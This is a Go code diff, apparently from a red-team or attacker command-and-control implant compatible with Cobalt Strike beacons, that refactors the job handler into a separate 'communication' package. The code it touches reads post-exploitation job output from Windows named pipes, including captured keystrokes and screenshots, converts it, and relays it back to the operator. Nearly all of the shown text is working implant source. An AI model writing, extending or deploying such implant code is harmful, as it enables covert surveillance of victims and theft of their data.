@@ -10,6 +10,7 @@ import (
 	"github.com/Microsoft/go-winio"
 	"golang.org/x/sys/windows"
 	"io"
+	"main/communication"
 	"main/util"
 	"syscall"
 	"time"
@@ -285,7 +286,7 @@ func ConvertData2UTF8(buf []byte) ([]byte, error) {
 	}
 	offset := len(buf) - buff.Len()
 
-	UTF8Data, err := CodepageToUTF8(data)
+	UTF8Data, err := communication.CodepageToUTF8(data)
 	if err != nil {
 		return nil, err
 	}
@@ -321,9 +322,9 @@ func ConvertWinUser2UTF8(buf []byte) ([]byte, error) {
 	if err != nil {
 		return nil, err
 	}
-	windowsName, err = CodepageToUTF8(windowsName)
+	windowsName, err = communication.CodepageToUTF8(windowsName)
 	if err != nil {
-		ErrorProcess(errors.New("result error"))
+		communication.ErrorProcess(errors.New("result error"))
 	}
 
 	buf = buf[:offset+4]
@@ -345,9 +346,9 @@ func HandlerJob(b []byte) ([]byte, error) {
 	sleepTimeByte := make([]byte, 2)
 	_, _ = buf.Read(callbackTypeByte)
 	_, _ = buf.Read(sleepTimeByte)
-	callbackType := int(ReadShort(callbackTypeByte))
+	callbackType := int(communication.ReadShort(callbackTypeByte))
 
-	sleepTime := ReadShort(sleepTimeByte)
+	sleepTime := communication.ReadShort(sleepTimeByte)
 	pipeName, err := util.ParseAnArg(buf)
 	if err != nil {
 		return nil, err
@@ -367,11 +368,11 @@ func HandlerJob(b []byte) ([]byte, error) {
 		go func() {
 			result, err := ReadNamedPipe(pipeName, callbackType, sleepTime)
 			if err != nil {
-				ErrorProcess(err)
+				communication.ErrorProcess(err)
 				return
 			}
-			DataProcess(callbackType, []byte(result))
-			DataProcess(0, []byte("Job success"))
+			communication.DataProcess(callbackType, []byte(result))
+			communication.DataProcess(0, []byte("Job success"))
 		}()
 		return []byte("Hold on"), nil
 	}
@@ -382,12 +383,12 @@ func HandlerJob(b []byte) ([]byte, error) {
 		if callbackType == CALLBACK_SCREENSHOT && len(resultBytes) > 4 {
 			resultBytes, err = ConvertWinUser2UTF8(resultBytes[4:])
 			if err != nil {
-				ErrorProcess(err)
+				communication.ErrorProcess(err)
 			}
 		}
-		DataProcess(callbackType, resultBytes)
+		communication.DataProcess(callbackType, resultBytes)
 	} else {
-		ErrorProcess(errors.New("result error"))
+		communication.ErrorProcess(errors.New("result error"))
 	}
 
 	if err != nil {
@@ -418,15 +419,15 @@ func ReadNamedPipe(pipeName []byte, callbackType int, sleepTime uint16) (string,
 			if callbackType == CALLBACK_KEYSTROKES && len(resultBytes) > 4 {
 				resultBytes, err = ConvertWinUser2UTF8(resultBytes)
 				if err != nil {
-					ErrorProcess(err)
+					communication.ErrorProcess(err)
 				}
 				resultBytes, err = ConvertData2UTF8(resultBytes)
 				if err != nil {
-					ErrorProcess(err)
+					communication.ErrorProcess(err)
 				}
 			}
 
-			DataProcess(callbackType, resultBytes)
+			communication.DataProcess(callbackType, resultBytes)
 			time.Sleep(time.Millisecond * time.Duration(sleepTime))
 		}
 		result += string(resultBytes)
